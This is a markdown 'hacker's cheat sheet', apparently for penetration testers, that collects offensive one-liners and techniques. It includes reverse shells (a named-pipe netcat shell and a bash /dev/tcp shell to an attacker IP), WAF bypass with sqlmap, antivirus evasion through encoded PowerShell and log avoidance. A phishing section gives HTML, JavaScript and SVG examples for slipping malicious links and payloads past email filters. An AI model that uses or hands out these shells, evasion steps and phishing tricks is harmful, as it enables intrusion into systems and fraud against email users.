## üß† Hacker's Cheat Sheet üß†

Only true hackers will appreciate these gems‚Äîcutting-edge tips and tricks that can elevate your penetration testing and ethical hacking skills. 

### üî• 1. Command Line Kung Fu

- **List all open ports** (with process info) on Linux:
  ```bash
  sudo netstat -tuln -p
  ```
> Quickly see what's open on your system without needing fancy tools.

- Find all hidden files on a Linux machine:
  ```
  find / -name ".*" -type f
  ```
> Great for uncovering hidden configurations or malicious scripts.

- Fast directory scanning with FFUF:
  ```
  ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .php,.html,.txt -o output.txt
  ```
> Quick and powerful fuzzing to discover hidden directories.

### üöÄ 2. Hidden Gems in Wireshark

- Capture only HTTP GET requests:

```
http.request.method == "GET"
```
> Skip the noise and capture just the GET requests to hunt for interesting activity.

- Filter for suspicious DNS activity:
  ```
  dns.qry.name == "evil.com"
  ```
> Target specific DNS queries to detect if someone's reaching out to malicious domains.

### üîí 3. Bypass Techniques

- **Bypass WAF using SQLMap with tamper scripts**:
    ```bash
    sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --level=5 --risk=3
    ```
    > Get around pesky WAFs with a tamper script and crank up the aggression.

- **Custom User-Agent to fool detection systems**:
    ```bash
    curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
    ```
    > Impersonate a search engine crawler to bypass access restrictions.

### üõ°Ô∏è 4. Advanced Reverse Shells

- **Obfuscated Netcat reverse shell**:
    ```bash
    mkfifo /tmp/lolpipe; nc 0</tmp/lolpipe | /bin/sh >/tmp/lolpipe 2>&1; rm /tmp/lolpipe
    ```
    > Use named pipes to create stealthier reverse shells, harder to detect by basic monitoring.

- **Bash TCP reverse shell** (for when Netcat isn‚Äôt available):
    ```bash
    bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
    ```
    > Minimal footprint, effective on many Unix-based systems.

### üíª 5. Stealth Techniques

- **Avoid logging by executing commands in memory (Linux)**:
    ```bash
    exec /bin/bash 0</dev/null 2>/dev/null
    ```
    > Run commands in a way that avoids leaving traces in `/var/log` files.

- **Evade AV detection with PowerShell base64 encoding**:
    ```bash
    powershell.exe -EncodedCommand <Base64 Encoded Command>
    ```
    > Hide your PowerShell commands by encoding them in Base64, bypassing some AV detection.

### üõ†Ô∏è 6. Tools You Might Not Know (But Should)

- [**Obsidian**](https://obsidian.md/) ‚Äì A tool for creating encrypted vaults of notes and penetration testing playbooks.
- [**Chaos Reader**](http://chaosreader.sourceforge.net/) ‚Äì Parse, analyze, and extract files from packet capture (.pcap) files.
- [**LinEnum**](https://github.com/rebootuser/LinEnum) ‚Äì A Linux enumeration script to quickly find privilege escalation vectors.

### üéØ 7. Fuzzing on Steroids

- **Fuzzing APIs with POST requests using FFUF**:
    ```bash
    ffuf -w wordlist.txt -X POST -d "parameter1=value&FUZZ=value" -u https://target.com/api/endpoint -o output.json
    ```
    > Quickly find API vulnerabilities by fuzzing POST request bodies.

- **Fuzzing JSON APIs with AFL (American Fuzzy Lop)**:
    ```bash
    afl-fuzz -i input/ -o output/ -- ./target_binary @@
    ```
    > Use AFL to find memory corruption issues in JSON parsers, or other binary targets.

üí° **Bonus Tip**: Always remember to document your findings in detail. Hacking without reporting is just half the work. üòâ

## üïµÔ∏è 8. Advanced Phishing Tactics üïµÔ∏è

Phishing has evolved into a complex craft, with attackers using sophisticated techniques to evade detection. Below are some **advanced, lesser-known phishing tactics** involving fragmentation and evasion, making it a unique addition to your hacker toolkit:

#### **1. Fragmented Links in Phishing Emails**
   - **Technique**: Split a malicious URL into multiple parts using HTML encoding or JavaScript fragments. This bypasses email filters that scan for specific malicious patterns.
   - **How**: Use JavaScript to reconstruct the URL upon user interaction.
   - **Example**:
     ```html
     <a href="http://safe-site.com/#frag1">Check this out</a>
     <!-- Later on the page -->
     <a href="frag2.com">More Info</a>
     <script>
       window.location.href = "http://safe-site.com/" + "frag2.com";
     </script>
     ```

#### **2. Multipart MIME Attachments**
   - **Technique**: Split a malicious payload across multiple MIME parts in an email attachment. Each part appears safe, but together they form a dangerous file.
   - **How**: Use `base64` encoding for parts and let the email client reassemble them.
   - **Example**:
     ```bash
     --==_MIME-Boundary
     Content-Type: application/octet-stream; name="part1"
     
     (base64-encoded malicious segment)
     --==_MIME-Boundary
     Content-Type: application/octet-stream; name="part2"
     
     (base64-encoded malicious segment)
     --==_MIME-Boundary--
     ```

#### **3. Obfuscated URLs Using HTML Encoding**
   - **Technique**: Encode URLs using HTML entities to obfuscate the destination. Multiple encoding layers make it hard for standard scanners to detect.
   - **How**: Use `%` encoding to hide URL parts.
   - **Example**:
     ```html
     <a href="http://%68%61%63%6B%65%72.com/%70%61%79%6C%6F%61%64">Click Here</a>
     ```

#### **4. Fragmented JavaScript Payloads**
   - **Technique**: Serve malicious JavaScript in fragments across different files, with each file appearing safe. The full attack is executed only when all fragments are loaded.
   - **How**: Use `<script>` tags to pull in pieces of malicious code.
   - **Example**:
     ```html
     <script src="legit-part1.js"></script>
     <script src="legit-part2.js"></script>
     <!-- Fully executes only if both parts are loaded -->
     ```

#### **5. Phishing Redirects with URL Fragments**
   - **Technique**: Utilize URL fragments (like `#`) to create dynamic redirects. Fragments are invisible to servers, making them harder to detect by security tools.
   - **How**: Use JavaScript to read and act on URL fragments.
   - **Example**:
     ```html
     <a href="https://trusted-site.com/#hidden-frag">Access Now</a>
     <script>
       if (window.location.hash === "#hidden-frag") {
         window.location.href = "http://malicious-site.com";
       }
     </script>
     ```

#### **6. Hidden Payloads in SVG Files**
   - **Technique**: Store phishing scripts inside SVG files, using SVG's ability to hold JavaScript for stealthy delivery.
   - **How**: Embed obfuscated JavaScript within the SVG `<script>` tag.
   - **Example**:
     ```html
     <svg>
       <script>
         var part1 = "alert('Gotcha! ";
         var part2 = "You‚Äôve been phished!')";
         eval(part1 + part2);
       </script>
     </svg>
     ```

#### **7. Obfuscating Content with CSS**
   - **Technique**: Hide malicious links or content within CSS rules. The full phishing payload only becomes visible when rendered in the email client.
   - **How**: Use CSS `:after` pseudo-elements to construct links in parts.
   - **Example**:
     ```html
     <style>
       .hidden1:after { content: 'http://'; }
       .hidden2:after { content: 'phish-site.com'; }
     </style>
     <div class="hidden1"></div><div class="hidden2"></div>
     ```

### **Pro Tips**:
- Experiment with different encoding and fragmentation combinations to see which methods bypass specific email clients and security tools.
